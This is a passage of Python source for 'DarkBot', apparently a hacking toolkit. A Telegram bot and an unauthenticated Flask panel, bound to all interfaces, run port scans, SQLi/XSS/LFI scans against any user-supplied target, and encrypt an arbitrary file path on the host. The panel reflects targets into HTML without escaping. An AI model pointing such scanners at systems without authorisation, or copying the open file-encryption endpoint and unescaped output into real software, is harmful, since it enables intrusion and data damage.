    ports_str = ""
    for port in result['ports']:
        if port['state'] == 'open':
            ports_str += f"Port {port['port']} ({port['service']}): Open\n"
            if len(ports_str) > 3000: # Telegram limit is ~4096 chars
                ports_str += "\n... (truncated)"
                break
                
    output += ports_str
    
    bot.send_message(message.chat.id, output, parse_mode='Markdown')

@bot.message_handler(commands=['webscan'])
def webscan_cmd(message):
    parts = message.text.split()
    if len(parts) > 1:
        url = parts[1]
    else:
        bot.reply_to(message, "Usage: /webscan <url>")
        return
        
    scanner = WebVulnScanner()
    result = scanner.full_scan(url)
    
    output = f"*URL:* {url}\n*Total Vulns:* {result['total_vulnerabilities']}\n"
    output += f"SQLi: {len(result['sql_injection'])}, XSS: {len(result['xss'])}, LFI: {len(result['lfi'])}\n"
    
    bot.send_message(message.chat.id, output, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_cmd(message):
    bot.reply_to(message, "Bot is online and operational.")

# ==================== FLASK WEB PANEL ====================
app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string("""
    <h1>DarkBot Web Panel</h1>
    <a href="/scan">Port Scan</a><br>
    <a href="/web">Web Vuln</a><br>
    <a href="/crypto">Crypto</a>
    """)

@app.route('/scan')
def scan_page():
    return f"""
    <h1>Port Scanner</h1>
    <form action="/do_scan" method="GET">
        Target: <input type="text" name="target"><br>
        <button type="submit">Scan</button>
    </form>
    """

@app.route('/do_scan')
def do_scan():
    target = request.args.get('target', '127.0.0.1')
    port_scanner = PortScanner()
    result = port_scanner.full_scan(target)
    
    html = f"<h1>Scan Results for {target}</h1><pre>{json.dumps(result, indent=2)}</pre>"
    return html

@app.route('/web')
def web_page():
    return """
    <h1>Web Vulnerability Scanner</h1>
    <form action="/do_webscan" method="GET">
        URL: <input type="text" name="url"><br>
        <button type="submit">Scan</button>
    </form>
    """

@app.route('/do_webscan')
def do_webscan():
    url = request.args.get('url', 'http://example.com')
    scanner = WebVulnScanner()
    result = scanner.full_scan(url)
    
    html = f"<h1>Scan Results for {url}</h1><pre>{json.dumps(result, indent=2)}</pre>"
    return html

@app.route('/crypto')
def crypto_page():
    return """
    <h1>Cryptography Tool</h1>
    <form action="/do_encrypt" method="GET">
        File Path: <input type="text" name="file"><br>
        <button type="submit">Encrypt</button>
    </form>
    """

@app.route('/do_encrypt')
def do_encrypt():
    file_path = request.args.get('file', './test.txt')
    crypto = CryptoTool()
    result = crypto.encrypt_file(file_path)
    
    html = f"<h1>Encryption Result</h1><pre>{json.dumps(result, indent=2)}</pre>"
    return html

# ==================== MAIN EXECUTION ====================
if __name__ == '__main__':
    logger.info("DarkBot Starting...")
    
    # Start Flask in a separate thread for the web panel
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
    logger.info("Web Panel started on http://0.0.0.0:5000")
    
    # Start Telegram Bot polling
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        logger.info("Bot stopped.")